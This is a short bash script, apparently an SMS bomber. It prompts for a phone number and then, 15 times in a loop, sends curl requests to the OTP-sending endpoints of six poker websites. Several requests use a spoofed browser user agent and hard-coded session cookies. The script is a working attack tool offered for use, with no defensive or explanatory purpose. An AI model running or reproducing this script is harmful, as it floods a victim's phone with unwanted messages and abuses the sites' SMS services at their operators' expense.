#!/bin/bash
echo please enter the mobile number..
read phonen
for x in {1..15}
do
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://pokersaint.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://pokerraj.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
curl http://ftrpoker.com/smsc?PHONE=$phonen
curl http://thespartanpoker.com/smsc?PHONE=$phonen
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://chipbazar.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://callingstation.in/SendOTP.asp?For=Phone&PhoneNo=$phonen"
done
